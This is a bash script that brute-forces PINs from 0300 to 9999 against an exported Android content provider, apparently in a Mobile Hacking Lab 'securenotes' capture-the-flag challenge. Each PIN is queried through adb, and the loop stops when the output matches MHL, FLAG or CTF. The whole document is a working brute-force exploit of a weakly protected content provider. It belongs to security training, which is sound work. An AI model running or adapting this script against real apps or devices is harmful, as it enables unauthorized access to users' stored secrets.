#!/bin/bash

# Start from where you left off
for i in $(seq -w 0300 9999); do
    # Query the provider
    res=$(adb shell content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=$i" | grep "Secret=")

    if [ ! -z "$res" ]; then
        # Check if the result contains our keywords (case-insensitive)
        # -E enables extended regex (the | symbol for OR)
        # -i makes it case-insensitive
        if echo "$res" | grep -Ei "MHL|FLAG|CTF" > /dev/null; then
            echo -e "\n------------------------------------------------"
            echo "[+] REAL SECRET FOUND!"
            echo "PIN: $i"
            echo "RESULT: $res"
            echo "------------------------------------------------"
            break
        else
            # It's a false positive (like 0299)
            echo "PIN $i: False positive (garbage). Continuing..."
        fi
    fi
done
